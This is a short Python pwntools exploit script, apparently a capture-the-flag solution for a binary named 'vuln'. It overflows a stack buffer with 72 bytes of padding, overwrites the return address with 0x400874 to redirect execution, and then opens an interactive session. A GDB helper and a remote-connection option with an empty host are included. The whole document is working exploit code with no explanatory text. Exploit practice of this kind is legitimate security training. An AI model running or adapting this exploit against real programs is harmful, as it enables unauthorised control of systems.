#!/usr/bin/python3

from pwn import *

exe = ELF('vuln', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+745

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)
# payload = asm('''
              
              
#               ''')
GDB()
payload = "a"*72 + p64(0x0000000000400874)
s(payload)
p.interactive()
